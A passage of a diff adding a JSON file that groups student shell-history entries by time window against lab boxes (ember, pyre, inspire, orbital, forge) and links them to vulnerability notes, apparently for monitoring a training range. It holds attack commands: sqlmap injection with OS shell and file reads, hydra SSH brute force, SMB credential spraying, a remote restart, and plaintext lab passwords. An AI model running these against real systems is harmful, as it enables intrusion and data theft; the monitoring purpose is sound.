+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:17:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.11/shell_history.csv",
+          "line": 198,
+          "command": "ssh rand2@10.100.7.46",
+          "timestamp": "2026-01-27T19:17:05"
+        },
+        {
+          "log_file": "logs/10.100.7.33/shell_history.csv",
+          "line": 113,
+          "command": "nxc smb 10.100.7.46 -p ''",
+          "timestamp": "2026-01-27T19:17:55"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 332,
+          "command": "evil-winrm -i 10.100.7.46 -u rand -p dFMVxYA4!",
+          "timestamp": "2026-01-27T19:17:35"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:42:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 838,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" -D \"pyrewatch\" -T \"alerts\" --threads $(nproc)\"",
+          "timestamp": "2026-02-02T19:42:00"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 847,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" -D \"pyrewatch\" -T \"alerts\" --threads $(nproc)\"",
+          "timestamp": "2026-02-02T19:42:18"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 848,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" -D \"pyrewatch\" --tables\"",
+          "timestamp": "2026-02-02T19:42:26"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 304,
+          "command": "curl http://10.100.7.45/panels.php?id=5 ORDER BY 1 -- -\"\"",
+          "timestamp": "2026-02-02T19:42:37"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T18:51:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 902,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --file-read=/home/pyre/ctrl.txt\"",
+          "timestamp": "2026-02-03T18:51:08"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 221,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --os-shell\"",
+          "timestamp": "2026-02-03T18:51:43"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T18:56:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 910,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=\"ls ../../opt\"\"",
+          "timestamp": "2026-02-03T18:56:02"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 911,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=\"cat ./index.php\"\"",
+          "timestamp": "2026-02-03T18:56:19"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 912,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=\"cat ./alerts.php\"\"",
+          "timestamp": "2026-02-03T18:56:41"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 227,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --os-cmd=\"ls\"\"",
+          "timestamp": "2026-02-03T18:56:59"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T19:05:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 230,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --os-shell\"",
+          "timestamp": "2026-02-03T19:05:59"
+        },
+        {
+          "log_file": "logs/10.100.7.31/shell_history.csv",
+          "line": 29,
+          "command": "hydra -t 4 -V -f -l pyre -P rockyou.txt.gz ssh://10.100.7.45",
+          "timestamp": "2026-02-03T19:05:17"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T19:28:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 938,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-shell\"",
+          "timestamp": "2026-02-03T19:28:45"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 249,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --os-shell\"",
+          "timestamp": "2026-02-03T19:28:21"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 250,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --os-shell\"",
+          "timestamp": "2026-02-03T19:28:25"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-10T19:21:00",
+      "target_ip": "10.100.7.48",
+      "target_box": "inspire",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 79,
+          "command": "nmap -sC -sV -p 22,80 10.100.7.48",
+          "timestamp": "2026-02-10T19:21:17"
+        },
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 80,
+          "command": "nmap -sC -sV -p 22,80 10.100.7.48",
+          "timestamp": "2026-02-10T19:21:35"
+        },
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 81,
+          "command": "nmap -sC -sV -p 22,80 10.100.7.48",
+          "timestamp": "2026-02-10T19:21:35"
+        },
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 82,
+          "command": "nmap -sC -sV -p 22,80 10.100.7.48",
+          "timestamp": "2026-02-10T19:21:35"
+        },
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 83,
+          "command": "gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt",
+          "timestamp": "2026-02-10T19:21:58"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 564,
+          "command": "mysql -h 10.100.7.48 -P 3306 -u inspire",
+          "timestamp": "2026-02-10T19:21:49"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/inspire/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "anonymous",
+            "base64",
+            "pickle"
+          ]
+        },
+        {
+          "file": "boxes/inspire/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "anonymous",
+            "pickle"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-10T19:56:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 113,
+          "command": "enum4linux -a 10.100.7.42",
+          "timestamp": "2026-02-10T19:56:27"
+        },
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 114,
+          "command": "nmap --script smb-enum-shares,smb-enum-users -p445 10.100.7.42",
+          "timestamp": "2026-02-10T19:56:40"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 611,
+          "command": "sqlcmd -S tcp:10.100.7.42,1433",
+          "timestamp": "2026-02-10T19:56:13"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-10T20:10:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.11/shell_history.csv",
+          "line": 356,
+          "command": "nxc smb 10.100.7.42 -u orbital -p 'Canopy@123'",
+          "timestamp": "2026-02-10T20:10:47"
+        },
+        {
+          "log_file": "logs/10.100.7.31/shell_history.csv",
+          "line": 96,
+          "command": "nxc smb 10.100.7.42 -u orbital -p 123 -X Restart-Computer",
+          "timestamp": "2026-02-10T20:10:46"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-09T18:52:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.33/shell_history.csv",
+          "line": 161,
+          "command": "ssh orbital@10.100.7.42",
+          "timestamp": "2026-02-09T18:52:52"
+        },
+        {
+          "log_file": "logs/10.100.7.33/shell_history.csv",
+          "line": 162,
+          "command": "ssh orbital@10.100.7.42",
+          "timestamp": "2026-02-09T18:52:58"
+        },
+        {
+          "log_file": "logs/10.100.7.33/shell_history.csv",
+          "line": 163,
+          "command": "ssh orbital@10.100.7.42",
+          "timestamp": "2026-02-09T18:52:59"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 478,
+          "command": "smbmap -H 10.100.7.42 -u guest -p \"",
+          "timestamp": "2026-02-09T18:52:25"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-09T19:37:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.33/shell_history.csv",
+          "line": 170,
+          "command": "evil-winrm -i 10.100.7.42 -u orbital -p securepassword",
+          "timestamp": "2026-02-09T19:37:16"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 511,
+          "command": "xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword",
+          "timestamp": "2026-02-09T19:37:21"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-12T19:54:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 13,
+          "command": "nmap 10.100.7.41 10.100.7.42 10.100.7.43",
+          "timestamp": "2026-01-12T19:54:39"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 34,
+          "command": "hydra -l guest -P /usr/share/wordlists/rockyou.txt ssh://10.100.7.42",
+          "timestamp": "2026-01-12T19:54:57"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-13T19:49:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 314,
+          "command": "nxc smb 10.100.7.42 -u guest -p '' --shares",
+          "timestamp": "2026-01-13T19:49:30"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 62,
+          "command": "xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword",
+          "timestamp": "2026-01-13T19:49:45"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-13T20:14:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 353,
+          "command": "nxc smb 10.100.7.42 -u orbital -p orbital\"\"",
+          "timestamp": "2026-01-13T20:14:46"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 81,
+          "command": "enum4linux -a 10.100.7.42",
+          "timestamp": "2026-01-13T20:14:38"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 82,
+          "command": "enum4linux -a 10.100.7.42",
+          "timestamp": "2026-01-13T20:14:39"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T18:59:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 63,
+          "command": "nxc smb http://10.100.7.46/ u-username p-password",
+          "timestamp": "2026-01-27T18:59:46"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 304,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:59:06"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 305,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:59:16"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 306,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:59:25"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 249,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:59:11"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 250,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:59:22"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 251,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:59:44"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:02:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 65,
+          "command": "nxc smb http://10.100.7.46/ u-username p-password",
+          "timestamp": "2026-01-27T19:02:00"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 634,
+          "command": "nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS'",
+          "timestamp": "2026-01-27T19:02:05"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 635,
+          "command": "nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS' --shares",
+          "timestamp": "2026-01-27T19:02:11"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 315,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:02:04"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 316,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:02:13"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 317,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:02:20"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 258,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:02:00"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 259,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:02:13"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 260,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:02:16"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 261,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:02:18"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 262,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:02:19"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-10T19:18:00",
+      "target_ip": "10.100.7.48",
+      "target_box": "inspire",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 78,
+          "command": "nmap -sC -sV -p- -T4 10.100.7.48",
+          "timestamp": "2026-02-10T19:18:29"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 563,
+          "command": "mysql -h 10.100.7.48 -P 3306 -uinspire",
+          "timestamp": "2026-02-10T19:18:01"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/inspire/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "anonymous",
+            "base64",
+            "pickle"
+          ]
+        },
+        {
+          "file": "boxes/inspire/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "anonymous",
+            "pickle"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-10T19:26:00",
+      "target_ip": "10.100.7.48",
+      "target_box": "inspire",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 100,
+          "command": "whatweb http://10.100.7.48",
+          "timestamp": "2026-02-10T19:26:05"
+        },
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 101,
+          "command": "gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt",
+          "timestamp": "2026-02-10T19:26:51"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 565,
+          "command": "mysql -h 10.100.7.48 -P 3306 -u inspire",
+          "timestamp": "2026-02-10T19:26:31"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/inspire/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "anonymous",
+            "base64",
+            "pickle"
+          ]
+        },
+        {
+          "file": "boxes/inspire/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "anonymous",
+            "pickle"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-10T19:54:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 110,
+          "command": "nmap -sC -sV -p 3389,445 10.100.7.42",
+          "timestamp": "2026-02-10T19:54:15"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 609,
+          "command": "10.100.7.42",
+          "timestamp": "2026-02-10T19:54:54"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-10T19:55:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 111,
+          "command": "nmap -sC -sV -p- -T4 10.100.7.42",
+          "timestamp": "2026-02-10T19:55:34"
+        },
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 112,
+          "command": "smbclient -L //10.100.7.42/ -N",
+          "timestamp": "2026-02-10T19:55:48"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 610,
+          "command": "nmap 10.100.7.42",
+          "timestamp": "2026-02-10T19:55:00"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T19:28:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 245,
+          "command": "nxc smb 10.100.7.46 -u guest  -p ''",
+          "timestamp": "2026-01-26T19:28:32"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 163,
+          "command": "nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth",
+          "timestamp": "2026-01-26T19:28:01"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T19:39:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 188,
+          "command": "xfreerdp3 /u:rand2 /v:10.100.7.46 /p:dFMVxYA4",
+          "timestamp": "2026-01-26T19:39:06"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 189,
+          "command": "nxc smb 10.100.7.46 -u rand -p dFMVxYA4!",
+          "timestamp": "2026-01-26T19:39:12"
+        },
+        {
+          "log_file": "logs/10.100.7.31/shell_history.csv",
+          "line": 20,
+          "command": "enum4linux -a 10.100.7.46",
+          "timestamp": "2026-01-26T19:39:30"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T20:01:00",
+      "target_ip": "10.100.7.44",
+      "target_box": "forge",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 618,
+          "command": "ssh -i ~/.ssh/helios_ssh_key root@10.100.7.44",
+          "timestamp": "2026-01-26T20:01:58"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 224,
+          "command": "gobuster dir -u https://http://10.100.7.44/ -w wordlist.txt",
+          "timestamp": "2026-01-26T20:01:04"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/forge/documentation.md",
+          "matches": [
+            "git",
+            "cron"
+          ]
+        },
+        {
+          "file": "boxes/forge/deploy/init-repo.sh",
+          "matches": [
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/forge/deploy/root-cron.sh",
+          "matches": [
+            "git",
+            "cron"
+          ]
+        },
+        {
+          "file": "boxes/forge/deploy/deploy.sh",
+          "matches": [
+            "git",
+            "cron"
+          ]
+        },
+        {
+          "file": "boxes/forge/deploy/nginx-git.conf",
+          "matches": [
+            "git"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T20:02:00",
+      "target_ip": "10.100.7.44",
+      "target_box": "forge",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 621,
+          "command": "ssh forge@10.100.7.44",
+          "timestamp": "2026-01-26T20:02:06"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 227,
+          "command": "gobuster dir -u https://http://10.100.7.44/ -w wordlist.txt",
+          "timestamp": "2026-01-26T20:02:37"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/forge/documentation.md",
+          "matches": [
+            "git",
+            "cron"
+          ]
+        },
+        {
+          "file": "boxes/forge/deploy/init-repo.sh",
+          "matches": [
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/forge/deploy/root-cron.sh",
